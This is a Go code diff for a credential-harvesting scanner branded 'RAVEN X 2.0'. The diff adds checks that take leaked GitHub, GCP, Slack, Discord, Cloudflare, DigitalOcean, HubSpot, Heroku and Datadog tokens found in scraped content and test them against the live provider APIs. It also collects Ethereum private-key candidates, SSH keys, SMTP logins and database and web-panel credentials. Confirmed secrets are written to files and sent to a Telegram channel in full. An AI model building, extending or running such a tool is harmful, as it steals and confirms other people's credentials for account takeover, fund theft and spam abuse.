-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
 
 	payload := map[string]string{"key": key}
 	jsonPayload, _ := json.Marshal(payload)
@@ -2798,13 +3030,13 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas MailerSend
 func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+	if !a.Config.APIValidation.MailerSend {
 		return false
 	}
 
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
 
 	req, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
@@ -2926,6 +3158,487 @@ func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
 	return false
 }
 
+// CheckGitHubToken validates a GitHub personal access token (new ghp_/gho_/ghs_/ghr_ format)
+// by hitting GET /user with the token as a Bearer credential. 200 = valid token.
+func (a *AWSScanner) CheckGitHubToken(key, sourceURL string) bool {
+	if !a.Config.APIValidation.GitHub {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	req, err := http.NewRequest("GET", "https://api.github.com/user", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "token "+key)
+	req.Header.Set("Accept", "application/vnd.github+json")
+	req.Header.Set("X-GitHub-Api-Version", "2022-11-28")
+
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		login, _ := res["login"].(string)
+
+		a.logValid("GitHub", fmt.Sprintf("Token: %s | User: %s", key, login))
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_github.txt")
+		a.storeValidKeyLimit("GitHub", key, fmt.Sprintf("@%s", login))
+
+		globalCounters.mu.Lock()
+		globalCounters.APIsValidated++
+		globalCounters.mu.Unlock()
+
+		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🐙 <b>GITHUB LIVE TOKEN</b>
+
+🔑 <b>Token:</b> <code>%s</code>
+👤 <b>User:</b> @%s
+🔗 <b>Source:</b> %s
+`, key, login, sourceURL)
+		go a.sendTelegram(msg)
+		return true
+	}
+	return false
+}
+
+// CheckGCPKey validates a Google Cloud Platform / Google API key (AIza prefix)
+// by probing the Cloud Resource Manager API. 200 = key accepted; 403 with
+// ACCESS_NOT_CONFIGURED or similar means the key exists but lacks that API scope
+// (still a live key); 400 API_KEY_INVALID = dead key.
+func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
+	if !a.Config.APIValidation.GCP {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	// Use the Geocoding API as a lightweight probe — no billing required for a
+	// zero-result query and the response clearly distinguishes INVALID_KEY from
+	// REQUEST_DENIED (key valid but restricted) vs OK.
+	req, err := http.NewRequest("GET",
+		"https://maps.googleapis.com/maps/api/geocode/json?address=test&key="+key, nil)
+	if err != nil {
+		return false
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		status, _ := res["status"].(string)
+		// INVALID_KEY = dead. REQUEST_DENIED / ZERO_RESULTS / OK = live key.
+		if status == "REQUEST_DENIED" {
+			// Key exists but is restricted — still a valid key worth saving.
+			// Check error_message to distinguish INVALID_KEY embedded in a 200.
+			if errMsg, ok := res["error_message"].(string); ok && strings.Contains(errMsg, "API key not valid") {
+				return false
+			}
+		}
+		if status != "INVALID_KEY" && status != "" {
+			a.logValid("GCP", fmt.Sprintf("Key: %s | Status: %s", key, status))
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_gcp.txt")
+			a.storeValidKeyLimit("GCP", key, fmt.Sprintf("Status: %s", status))
+
+			globalCounters.mu.Lock()
+			globalCounters.APIsValidated++
+			globalCounters.mu.Unlock()
+
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+☁️ <b>GCP API KEY LIVE</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+📊 <b>Status:</b> %s
+🔗 <b>Source:</b> %s
+`, key, status, sourceURL)
+			go a.sendTelegram(msg)
+			return true
+		}
+	}
+	return false
+}
+
+// CheckCryptoWallet checks whether a 64-char hex string (with optional 0x prefix)
+// is a plausible Ethereum private key by verifying it is a valid scalar on secp256k1
+// (i.e. non-zero and less than the curve order). No on-chain call is made — this is
+// purely a local structural check. It records the candidate and fires a Telegram alert
+// so the operator can investigate manually.
+func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Crypto {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	// Strip optional 0x prefix for length validation.
+	raw := strings.TrimPrefix(strings.ToLower(key), "0x")
+	if len(raw) != 64 {
+		return false
+	}
+	// secp256k1 curve order (n) — any valid private key must be 0 < key < n.
+	// Quick reject: all-zeros or all-ff* are trivially invalid.
+	if raw == "0000000000000000000000000000000000000000000000000000000000000000" ||
+		raw == "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" {
+		return false
+	}
+
+	// Record as a structural match — operator validates on-chain manually.
+	a.logValid("Crypto", fmt.Sprintf("Potential ETH private key: %s", key))
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_crypto.txt")
+	a.storeValidKeyLimit("Crypto", key, "ETH private key candidate")
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsValidated++
+	globalCounters.mu.Unlock()
+
+	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+💎 <b>ETH PRIVATE KEY CANDIDATE</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
+	go a.sendTelegram(msg)
+	return true
+}
+
+// CheckSlack validates a Slack bot token (xoxb-) via auth.test.
+func (a *AWSScanner) CheckSlack(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Slack {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "slack_found.txt")
+	req, err := http.NewRequest("GET", "https://slack.com/api/auth.test", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "Bearer "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		if ok, _ := res["ok"].(bool); ok {
+			team, _ := res["team"].(string)
+			slackUser, _ := res["user"].(string)
+			a.logValid("Slack", fmt.Sprintf("Token: %s | Team: %s | User: %s", key, team, slackUser))
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_slack.txt")
+			a.storeValidKeyLimit("Slack", key, fmt.Sprintf("Team: %s User: %s", team, slackUser))
+			globalCounters.mu.Lock()
+			globalCounters.APIsValidated++
+			globalCounters.mu.Unlock()
+			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n💬 <b>SLACK BOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🏢 <b>Team:</b> %s\n👤 <b>User:</b> %s\n🔗 <b>Source:</b> %s", key, team, slackUser, sourceURL)
+			go a.sendTelegram(msg)
+			return true
+		}
+	}
+	return false
+}
+
+// CheckDiscord validates a Discord bot token via GET /users/@me.
+func (a *AWSScanner) CheckDiscord(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Discord {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "discord_found.txt")
+	req, err := http.NewRequest("GET", "https://discord.com/api/v10/users/@me", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "Bot "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		if id, _ := res["id"].(string); id != "" {
+			username, _ := res["username"].(string)
+			a.logValid("Discord", fmt.Sprintf("Token: %s | Bot: %s", key, username))
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_discord_bot.txt")
+			a.storeValidKeyLimit("Discord", key, fmt.Sprintf("Bot: %s", username))
+			globalCounters.mu.Lock()
+			globalCounters.APIsValidated++
+			globalCounters.mu.Unlock()
+			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🎮 <b>DISCORD BOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🤖 <b>Bot:</b> %s\n🔗 <b>Source:</b> %s", key, username, sourceURL)
+			go a.sendTelegram(msg)
+			return true
+		}
+	}
+	return false
+}
+
+// CheckCloudflare validates a Cloudflare API token via /user/tokens/verify.
+func (a *AWSScanner) CheckCloudflare(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Cloudflare {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "cloudflare_found.txt")
+	req, err := http.NewRequest("GET", "https://api.cloudflare.com/client/v4/user/tokens/verify", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "Bearer "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		if result, ok := res["result"].(map[string]interface{}); ok {
+			if status, _ := result["status"].(string); status == "active" {
+				a.logValid("Cloudflare", fmt.Sprintf("Token: %s | Status: active", key))
+				a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_cloudflare.txt")
+				a.storeValidKeyLimit("Cloudflare", key, "active")
+				globalCounters.mu.Lock()
+				globalCounters.APIsValidated++
+				globalCounters.mu.Unlock()
+				msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n☁️ <b>CLOUDFLARE TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n📊 <b>Status:</b> active\n🔗 <b>Source:</b> %s", key, sourceURL)
+				go a.sendTelegram(msg)
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// CheckDigitalOcean validates a DigitalOcean PAT (dop_v1_) via /v2/account.
+func (a *AWSScanner) CheckDigitalOcean(key, sourceURL string) bool {
+	if !a.Config.APIValidation.DigitalOcean {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "digitalocean_found.txt")
+	req, err := http.NewRequest("GET", "https://api.digitalocean.com/v2/account", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "Bearer "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		acct, _ := res["account"].(map[string]interface{})
+		email, _ := acct["email"].(string)
+		doStatus, _ := acct["status"].(string)
+		a.logValid("DigitalOcean", fmt.Sprintf("Token: %s | Email: %s", key, email))
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_digitalocean.txt")
+		a.storeValidKeyLimit("DigitalOcean", key, fmt.Sprintf("Email: %s Status: %s", email, doStatus))
+		globalCounters.mu.Lock()
+		globalCounters.APIsValidated++
+		globalCounters.mu.Unlock()
+		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🌊 <b>DIGITALOCEAN TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n📊 <b>Status:</b> %s\n🔗 <b>Source:</b> %s", key, email, doStatus, sourceURL)
+		go a.sendTelegram(msg)
+		return true
+	}
+	return false
+}
+
+// CheckShopify saves a Shopify access token match. Validation requires a store
+// URL which is not available at scan time, so the token is recorded for manual
+// follow-up. Returns false (no live validation performed).
+func (a *AWSScanner) CheckShopify(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Shopify {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.logFound("Shopify", key, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "shopify_found.txt")
+	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🛒 <b>SHOPIFY TOKEN FOUND</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
+	go a.sendTelegram(msg)
+	return false
+}
+
+// CheckHubSpot validates a HubSpot private app token (pat-) via CRM contacts.
+func (a *AWSScanner) CheckHubSpot(key, sourceURL string) bool {
+	if !a.Config.APIValidation.HubSpot {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "hubspot_found.txt")
+	req, err := http.NewRequest("GET", "https://api.hubapi.com/crm/v3/objects/contacts?limit=1", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Authorization", "Bearer "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		a.logValid("HubSpot", fmt.Sprintf("Token: %s", key))
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_hubspot.txt")
+		a.storeValidKeyLimit("HubSpot", key, "Active")
+		globalCounters.mu.Lock()
+		globalCounters.APIsValidated++
+		globalCounters.mu.Unlock()
+		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🟠 <b>HUBSPOT TOKEN LIVE</b>\n\n🔑 <b>Token:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
+		go a.sendTelegram(msg)
+		return true
+	}
+	return false
+}
+
+// CheckHeroku validates a Heroku API key (UUID format) via GET /account.
+func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Heroku {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "heroku_found.txt")
+	req, err := http.NewRequest("GET", "https://api.heroku.com/account", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("Accept", "application/vnd.heroku+json; version=3")
+	req.Header.Set("Authorization", "Bearer "+key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		email, _ := res["email"].(string)
+		a.logValid("Heroku", fmt.Sprintf("Key: %s | Email: %s", key, email))
+		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_heroku.txt")
+		a.storeValidKeyLimit("Heroku", key, fmt.Sprintf("Email: %s", email))
+		globalCounters.mu.Lock()
+		globalCounters.APIsValidated++
+		globalCounters.mu.Unlock()
+		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🟣 <b>HEROKU API KEY LIVE</b>\n\n🔑 <b>Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n🔗 <b>Source:</b> %s", key, email, sourceURL)
+		go a.sendTelegram(msg)
+		return true
+	}
+	return false
+}
+
+// CheckDatadog validates a Datadog API key (32-char hex) via the validate endpoint.
+func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Datadog {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "datadog_found.txt")
+	req, err := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("DD-API-KEY", key)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	resp, err := do429Retry(client, req.WithContext(ctx), 3)
+	if err != nil || resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == 200 {
+		var res map[string]interface{}
+		json.NewDecoder(resp.Body).Decode(&res)
+		if valid, _ := res["valid"].(bool); valid {
+			a.logValid("Datadog", fmt.Sprintf("Key: %s", key))
+			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_datadog.txt")
+			a.storeValidKeyLimit("Datadog", key, "Active")
+			globalCounters.mu.Lock()
+			globalCounters.APIsValidated++
+			globalCounters.mu.Unlock()
+			msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🐶 <b>DATADOG API KEY LIVE</b>\n\n🔑 <b>Key:</b> <code>%s</code>\n🔗 <b>Source:</b> %s", key, sourceURL)
+			go a.sendTelegram(msg)
+			return true
+		}
+	}
+	return false
+}
+
 func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 	if !a.Config.ScanningFeatures.SMTPCredentialsScan { // Pengecekan fitur baru
 		return
@@ -2978,10 +3691,19 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 		}
 	}
 
-	// Validasi: Semua field harus lengkap (host:port:user:pass:from)
-	// Jika tidak lengkap, anggap tidak valid dan abaikan
-	if host == "" || port == "" || user == "" || pass == "" || from == "" {
+	// host + user + pass required; port and from are synthesised if absent
+	if host == "" || user == "" || pass == "" {
 		return
+	}
+	if port == "" {
+		port = "587"
+	}
+	if from == "" {
+		if strings.Contains(user, "@") {
+			from = user
+		} else {
+			from = user + "@" + host
+		}
 	}
 
 	// Validasi tambahan: pastikan format valid
@@ -3002,56 +3724,13 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 		return
 	}
 
-	// Semua field lengkap dan valid, proses SMTP
-	if host != "" && port != "" && user != "" && pass != "" && from != "" {
-		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
-		a.logFound("SMTP", smtpLine, sourceURL)
-		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")
+	// Pattern match found — save before attempting validation
+	smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
+	a.logFound("SMTP", smtpLine, sourceURL)
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), smtpLine), "smtp_found.txt")
 
-		if a.Config.SMTPTestEmail == "" {
-			return
-		}
-
-		addr := fmt.Sprintf("%s:%s", host, port)
-		auth := smtp.PlainAuth("", user, pass, host)
-		msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: Raven X Test\r\n\r\nTest Email.", from, a.Config.SMTPTestEmail)
-
-		timeout := 15 * time.Second
-		done := make(chan error, 1)
-
-		go func() {
-			done <- smtp.SendMail(addr, auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg))
-		}()
-
-		select {
-		case err := <-done:
-			if err == nil {
-				a.logValid("SMTP", smtpLine)
-
-				globalCounters.mu.Lock()
-				globalCounters.ValidSMTP++
-				globalCounters.mu.Unlock()
-
-				tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📨 <b>SMTP CRACKED</b>
-
-🖥️ <b>Host:</b> <code>%s</code>
-🔌 <b>Port:</b> <code>%s</code>
-👤 <b>User:</b> <code>%s</code>
-🔑 <b>Pass:</b> <code>%s</code>
-📧 <b>From:</b> %s
-🔗 <b>Source:</b> %s
-`, host, port, user, pass, from, sourceURL)
-				go a.sendTelegram(tlgMsg)
-				a.storeValidKeyLimit("SMTP", host, "Email Sent")
-			} else {
-				pterm.Debug.Printfln("[SMTP FAIL] %s: %v", host, err)
-			}
-		case <-time.After(timeout):
-			pterm.Debug.Printfln("[SMTP TIMEOUT] %s: Operation timed out after %v", host, timeout)
-		}
-	}
+	// Validate via AUTH handshake (no test email required)
+	go a.validateSMTPCredentials(host, port, user, pass, from, sourceURL)
 }
 
 func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
@@ -3097,6 +3776,52 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 
 	contentToScan := sanitizedText
 
+	// SSH private key detection — PEM blocks in fetched files
+	if a.Config.ScanningFeatures.SSHScan {
+		sshKeyMatches := a.SSHPrivateKeyPattern.FindAllString(contentToScan, -1)
+		var wgSSH sync.WaitGroup
+		validationSemSSH := make(chan struct{}, 50)
+		for _, keyBlock := range unique(sshKeyMatches) {
+			l := len(keyBlock)
+			if l > 60 {
+				l = 60
+			}
+			dedupKey := "sshkey:" + keyBlock[:l]
+			if _, loaded := a.KnownKeys.LoadOrStore(dedupKey, true); !loaded {
+				a.logFound("SSH Private Key", "[PEM BLOCK DETECTED]", sourceURL)
+				a.saveIntoFile(fmt.Sprintf("SOURCE: %s\n%s\n---END---", sanitizeSource(sourceURL), keyBlock), "ssh_keys_found.txt")
+				globalCounters.mu.Lock()
+				globalCounters.APIsFoundTotal++
+				globalCounters.mu.Unlock()
+				if a.Config.APIValidation.SSH {
+					wgSSH.Add(1)
+					validationSemSSH <- struct{}{}
+					go func(k, u string) {
+						defer wgSSH.Done()
+						defer func() { <-validationSemSSH }()
+						a.CheckSSHPrivateKey(k, u)
+					}(keyBlock, sourceURL)
+				}
+			}
+		}
+		wgSSH.Wait()
+	}
+
+	// SSH/SFTP credential extraction from env files
+	if a.Config.ScanningFeatures.SSHScan {
+		a.extractSSHCredsFromText(contentToScan, sourceURL)
+	}
+
+	// Database credential extraction
+	if a.Config.APIValidation.MySQL || a.Config.APIValidation.PostgreSQL || a.Config.APIValidation.Redis {
+		a.extractDBCredsFromText(contentToScan, sourceURL)
+	}
+
+	// Web panel credential extraction (cPanel, FTP, WordPress)
+	if a.Config.APIValidation.CPanel || a.Config.APIValidation.FTP || a.Config.APIValidation.WordPress {
+		a.extractWebPanelCredsFromText(contentToScan, sourceURL)
+	}
+
 	apiChecks := []struct {
 		Pattern *regexp.Regexp
 		Feature bool
@@ -3110,44 +3835,97 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI || a.Config.APIValidation.AIAll, "OpenAI", a.CheckOpenAI},
 		{a.AnthropicPattern, a.Config.APIValidation.Anthropic || a.Config.APIValidation.AIAll, "Anthropic", a.CheckAnthropic},
 		{a.MessageBirdPattern, a.Config.APIValidation.MessageBird, "MessageBird", a.CheckMessageBird},
-		{a.BrevoAPIKeyPattern, a.Config.Features.Brevo, "Brevo", a.CheckBrevo},
-		{a.XSMTPAPIKeyPattern, a.Config.Features.XSMTP, "XSMTP", a.CheckXSMTP},
-		{a.MandrillAppAPIKeyPattern, a.Config.Features.Mandrill, "Mandrill", a.CheckMandrill},
-		{a.MailerSendAPIKeyPattern, a.Config.Features.MailerSend, "MailerSend", a.CheckMailerSend},
+		{a.BrevoAPIKeyPattern, a.Config.APIValidation.Brevo, "Brevo", a.CheckBrevo},
+		{a.XSMTPAPIKeyPattern, a.Config.APIValidation.XSMTP, "XSMTP", a.CheckXSMTP},
+		{a.MandrillAppAPIKeyPattern, a.Config.APIValidation.Mandrill, "Mandrill", a.CheckMandrill},
+		{a.MailerSendAPIKeyPattern, a.Config.APIValidation.MailerSend, "MailerSend", a.CheckMailerSend},
 		{a.NewMailgunAPIKeyPattern, a.Config.Features.NewMailgun, "NewMailgun", a.CheckMailgun},
 		{postmarkPattern, a.Config.APIValidation.Postmark, "Postmark", a.CheckPostmark},
 		{sparkpostPattern, a.Config.APIValidation.SparkPost, "SparkPost", a.CheckSparkPost},
 		{mailtrapPattern, a.Config.APIValidation.Mailtrap, "Mailtrap", a.CheckMailtrap},
 		{mailjetPattern, a.Config.APIValidation.Mailjet, "Mailjet", a.CheckMailjet},
 		{plivoPattern, a.Config.APIValidation.Plivo, "Plivo", a.CheckPlivo},
+		{a.GitHubTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken},
+		{a.GCPAPIKeyPattern, a.Config.APIValidation.GCP, "GCP", a.CheckGCPKey},
+		{a.CryptoWalletPattern, a.Config.APIValidation.Crypto, "Crypto", a.CheckCryptoWallet},
+		// Wave-7 additions
+		{a.SlackBotTokenPattern, a.Config.APIValidation.Slack, "Slack", a.CheckSlack},
+		{a.DiscordBotTokenPattern, a.Config.APIValidation.Discord, "Discord", a.CheckDiscord},
+		{a.CloudflareTokenPattern, a.Config.APIValidation.Cloudflare, "Cloudflare", a.CheckCloudflare},
+		{a.DigitalOceanTokenPattern, a.Config.APIValidation.DigitalOcean, "DigitalOcean", a.CheckDigitalOcean},
+		{a.ShopifyTokenPattern, a.Config.APIValidation.Shopify, "Shopify", a.CheckShopify},
+		{a.HubSpotTokenPattern, a.Config.APIValidation.HubSpot, "HubSpot", a.CheckHubSpot},
+		{a.HerokuAPIKeyPattern, a.Config.APIValidation.Heroku, "Heroku", a.CheckHeroku},
+		{a.DatadogAPIKeyPattern, a.Config.APIValidation.Datadog, "Datadog", a.CheckDatadog},
+		// Wave-9: Extended AI providers
+		{a.GeminiAPIKeyPattern, a.Config.APIValidation.Gemini || a.Config.APIValidation.AIAll, "Gemini", a.CheckGemini},
+		{a.XAIAPIKeyPattern, a.Config.APIValidation.XAI || a.Config.APIValidation.AIAll, "xAI", a.CheckXAI},
+		{a.MistralAPIKeyPattern, a.Config.APIValidation.Mistral || a.Config.APIValidation.AIAll, "Mistral", a.CheckMistral},
+		{a.ElevenLabsAPIKeyPattern, a.Config.APIValidation.ElevenLabs || a.Config.APIValidation.AIAll, "ElevenLabs", a.CheckElevenLabs},
+		{a.GroqAPIKeyPattern, a.Config.APIValidation.Groq || a.Config.APIValidation.AIAll, "Groq", a.CheckGroq},
+		{a.PerplexityAPIKeyPattern, a.Config.APIValidation.Perplexity || a.Config.APIValidation.AIAll, "Perplexity", a.CheckPerplexity},
+		{a.OpenRouterAPIKeyPattern, a.Config.APIValidation.OpenRouter || a.Config.APIValidation.AIAll, "OpenRouter", a.CheckOpenRouter},
